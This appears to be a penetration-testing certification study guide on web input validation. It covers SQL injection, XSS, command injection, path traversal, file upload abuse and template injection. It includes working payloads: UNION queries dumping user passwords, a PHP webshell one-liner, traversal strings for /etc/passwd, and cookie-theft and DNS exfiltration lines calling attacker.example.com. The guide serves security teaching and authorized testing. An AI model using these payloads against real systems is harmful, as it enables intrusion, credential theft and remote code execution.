# eWPT Methodology — Phase 04: Input Validation Testing

> Web Application Penetration Testing · INE-Cybersecurity-Certifications-Guide

Input validation failures happen when untrusted data reaches a dangerous interpreter — SQL, HTML/JavaScript, the OS shell, the filesystem, or a template engine — without being neutralized. This phase covers the big families a web tester must recognize: SQL injection, XSS, command injection, path traversal/LFI, file upload abuse, and SSTI. Every payload below is for **authorized lab environments only** (your own VMs, PortSwigger Academy labs, or client targets in scope). Never fire these at systems you do not own or are not contracted to test.

## General Method

Attack each input surface systematically:

1. **Inventory the inputs** (Phase 01): query strings, POST bodies, JSON fields, headers, cookies, file names, and uploaded files.
2. **Probe for reflections and errors:** submit a unique marker value and watch where it appears in the response (reflected? in HTML? in JS? in an attribute?).
3. **Fuzz with class-specific payloads**, observe differences, and confirm with a proof-of-impact payload rather than a crash.
4. **Document** the request, the tampered parameter, and the observable difference.

## SQL Injection (SQLi)

SQLi occurs when user input is concatenated into a SQL query. Detection classes:

- **Error-based:** malformed input makes the database error appear in the response.
- **UNION-based:** you merge your own `SELECT` into the original query to read other tables.
- **Blind:** no data or errors come back; you infer truth by boolean responses or time delays.

### Detection

```sql
-- Start with quotes and boolean probes; watch for behavior changes
'          -- syntax error? 500? empty result?
' OR '1'='1 -- always-true variant
' OR '1'='2 -- always-false variant (control)
admin' --   -- comment out the rest of the WHERE clause
```

```text
# With Burp/ffuf, an automated first pass (authorized target only):
# - Send each parameter through a small SQLi wordlist.
# - Look for anomalous status codes, response lengths, and error strings
#   ("syntax error", "ORA-", "SQLSTATE", "Unclosed quotation mark").
```

### Error-based exploitation

```bash
# If the app leaks DB errors, ask the database directly
curl -s "https://app.example.com/item?id=1' AND 1=CONVERT(int,@@version)-- -"
# Error text often reveals the DBMS and version.
```

### UNION-based exploitation

Rules for a working UNION: match the **number of columns** of the original query, then their types.

```sql
-- 1. Find the column count by incrementing NULLs
' ORDER BY 1-- -      -- works
' ORDER BY 5-- -      -- error means fewer than 5 columns
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL,NULL-- -   -- no error => 3 columns

-- 2. Find a string column, then dump data there
' UNION SELECT NULL,NULL,@@version-- -
' UNION SELECT NULL,NULL,username||':'||password FROM users-- -  (Oracle/Postgres)
' UNION SELECT NULL,NULL,CONCAT(user,0x3a,password) FROM users-- -  (MySQL)
```

### Blind exploitation

```sql
-- Boolean blind: page differs between true and false
' AND '1'='1            -- normal page
' AND '1'='2            -- different page/empty => injectable boolean

-- Time-based blind: sleep if the condition holds (authorized targets only!)
' AND (SELECT CASE WHEN (SELECT user)='admin' THEN pg_sleep(5) ELSE 0 END)-- -
```

For blind cases at scale, prefer tooling over manual loops: `sqlmap -u URL --batch --dbs` on an authorized target is the standard way to confirm and scope a blind injection quickly.

## Cross-Site Scripting (XSS)

XSS runs attacker JavaScript in a victim's browser session. Reflected (in the response to the same request), stored (persisted and served to other users), and DOM-based (payload executed purely client-side from `location`, `document.referrer`, or `localStorage` data).

### Detection

```text
# Submit a unique harmless marker and locate it in the response:
"><svg/onload=alert(1)>       # classic reflected test in a search field
'"><img src=x onerror=alert(1)> # context-agnostic starter
```

Pay attention to the **context** where the value lands:

```html
<!-- In HTML text:        <b>SEARCH</b>            -> inject <script> or <img onerror>
     In an attribute:     <input value="SEARCH">   -> break out with "><img onerror=...>
     In JavaScript:       var x = 'SEARCH';        -> break out with ';alert(1)//
     In a URL:            <a href="SEARCH">        -> try javascript:alert(1) -->
```

### Exploitation basics (lab)

```bash
# Confirm execution in a lab, then prove impact with cookie theft concepts:
# <script>fetch('https://attacker.example.com/c?c='+document.cookie)</script>
# In a stored context (comments, profile fields), the payload runs for every visitor.
# DOM XSS: no server reflection — hunt sinks (innerHTML, document.write, eval)
# fed by sources like location.hash / postMessage.
```

Defense notes: encoding depends on context (HTML-escape, attribute-escape, JS-string-escape), plus a Content-Security-Policy as defense in depth. `HttpOnly` cookies blunt cookie theft but do not stop payload execution.

## Command Injection

If user input flows into a shell command (`system()`, `exec()`, `subprocess`), an attacker can run OS commands.

### Detection

```text
# Inject a command separator plus a benign marker command
127.0.0.1; whoami            # works when the app appends your input to a ping
127.0.0.1 && whoami
127.0.0.1 | whoami
`whoami`                      # backticks execute in some shells
$(whoami)
```

### Exploitation basics (lab)

```bash
# Ping-style endpoint example
curl -s -X POST https://app.example.com/ping -d 'ip=127.0.0.1; id'
# If "uid=..." appears in the response, the injection executes.

# Out-of-band confirmation when output is blind
curl -s -X POST https://app.example.com/ping -d "ip=127.0.0.1; nslookup $(whoami).attacker.example.com"
# Then check your DNS logs for the subdomain lookup.
```

Confirm the executing user and OS first (`id`, `whoami`, `uname -a`) and stop at proof of execution unless the engagement explicitly authorizes deeper access.

## Path Traversal / Local File Inclusion (LFI)

Path traversal reads arbitrary files by manipulating path components; LFI includes server-side files into the response.

### Detection

```text
GET /download?file=report.pdf
# Traversal attempts (URL-encode dots/slashes when the app decodes once)
file=../../../../etc/passwd
file=..%2f..%2f..%2f..%2fetc%2fpasswd      # encoded
file=....//....//....//etc/passwd           # bypass naive ../ filtering
file=..%252f..%252fetc%252fpasswd           # double-encoding when decoded twice
# Windows targets: ..\..\windows\win.ini, and absolute paths /etc/passwd
```

### Confirming

```bash
curl -s "https://app.example.com/download?file=../../../../etc/passwd"
# Success looks like: root:x:0:0:root:/root:/bin/bash ...

# LFI flavor that then executes PHP (authorized lab):
# GET /index.php?page=../../../../tmp/shell   -> combined with an uploaded file
# or PHP wrappers:  ?page=php://filter/convert.base64-encode/resource=config.php
```

If the app prepends a directory or appends an extension, test those constraints (`/var/www/html/` prefix with `../` still escaping; `.php` appended — try null bytes only on old PHP, otherwise wrappers).

## File Upload Abuse

Upload endpoints fail when they accept files the server later executes or serves from a web-accessible path.

### Detection and exploitation ideas (lab)

- Upload a benign file, then request it back: does the server reveal the stored path? Is it under the web root with a guessable name?
- Content-type and extension checks are often client-side only — bypass by changing the extension case (`.PhP`), adding a trailing dot/space, or double extension (`shell.php.jpg` where the server takes the last known extension — test the parser's actual behavior).
- If the server runs the file (PHP/ASPX/JSP upload dirs), a webshell is the goal:

```php
<?php echo shell_exec($_GET['c']); ?>
```

- If the server does not execute but serves the file, the residual risk is stored XSS via `.html`/`.svg` uploads — an `<svg onload=alert(document.domain)>` served from the app origin defeats many same-origin assumptions.

### Safe lab framing

```text
# Only test upload handling in a sandbox you control.
# 1. Upload a harmless marker file, retrieve it, confirm path + content-type.
# 2. Try an image with a polyglot payload if testing XSS via uploads.
# 3. Never upload real malware or attempt to pivot to other lab machines.
```

## Server-Side Template Injection (SSTI) — Concept

If user input reaches a template engine (Jinja2, Twig, Freemarker, Velocity) and the engine evaluates it, you get SSTI — often a fast route to remote code execution.

### Detection

```text
# Math probe: template expressions evaluate, plain text does not
{{7*7}}      # -> 49 in the response means evaluation is happening
${7*7}       # Freemarker/JSP style
#{7*7}       # some engines (Thymeleaf/Ruby)
<%= 7*7 %>   # ERB style
```

### Exploitation basics (concept, lab only)

```text
# Jinja2 (Python) proof-of-concept chain, run only in your own lab:
# {{7*7}} first. Then read the engine's object graph:
# {{config}} reveals settings; deeper chains reach __class__/__mro__/__subclasses__
# to call os.popen. Always verify the engine before chaining — each engine
# (Jinja2, Twig, Freemarker) has its own gadget syntax.
```

The right fix is to treat templates as code, never interpolating user input into them.

## Common Mistakes & Tips

- **Testing only GET parameters.** POST bodies, JSON, cookies, headers, and multipart file names are equally injectable. Exercise each surface.
- **Skipping the detection phase.** Firing `sqlmap` or a full XSS polyglot list before confirming reflection wastes time and creates noise. Confirm the sink first with a unique marker.
- **Ignoring context.** An XSS payload that works in HTML text fails inside a JS string or an attribute — read where your input lands before crafting the escape.
- **One payload, one conclusion.** Boolean-blind SQLi, time delays, and error differences each need a true/control/false trio before you claim injection.
- **Unencoded traversal.** If `../../etc/passwd` fails, encoding variations (`..%2f`, double encoding) and OS differences are the next step, not giving up.
- **Forgetting stored impact.** Stored XSS and stored HTML uploads are higher severity than reflected because they hit every visitor, not just the tester.
- **Overstepping in labs.** Confirming RCE via SSTI/command injection is enough for a lab finding — stop there unless the scenario explicitly asks for a full shell. Never run these families outside authorization.

## Checklist / Self-Test

- [ ] I inventoried every input surface (parameters, body fields, JSON, headers, cookies, uploads).
- [ ] I confirmed each injectable context with a unique marker before exploiting.
- [ ] SQLi: I distinguished error-based, UNION, and blind, and confirmed with a control probe.
- [ ] XSS: I identified the reflection context (HTML/attribute/JS/DOM) and proved execution in the lab.
- [ ] Command injection: I confirmed execution with an `id`/`whoami` marker rather than guessing.
- [ ] Path traversal/LFI: I tried encoded and double-encoded variants and confirmed file disclosure.
- [ ] File uploads: I tested extension/content-type parsing and the served path of uploaded files.
- [ ] SSTI: I probed with a math expression (`{{7*7}}`) and identified the engine before chaining.

> **Verification:** the OWASP Top 10 category names were checked against the OWASP Top 10 2021 sources (`A03:2021 – Injection`, `A05:2021 – Security Misconfiguration`) on 2026-09-19. Corrections applied from the 19 Sep 2026 audit.

## Further Resources

- OWASP Top 10 — A03:2021 Injection and A05:2021 Security Misconfiguration are the categories this phase maps to; see the project page for current mappings: https://owasp.org/www-project-top-ten/
- OWASP Web Security Testing Guide — WSTG-INPV (Input Validation Testing) covers SQLi, XSS, command injection, LFI, and uploads chapter by chapter: https://owasp.org/www-project-web-security-testing-guide/
- PortSwigger Web Security Academy — dedicated learning paths and labs for SQL injection, XSS, command injection, path traversal, file uploads, and SSTI: https://portswigger.net/web-security
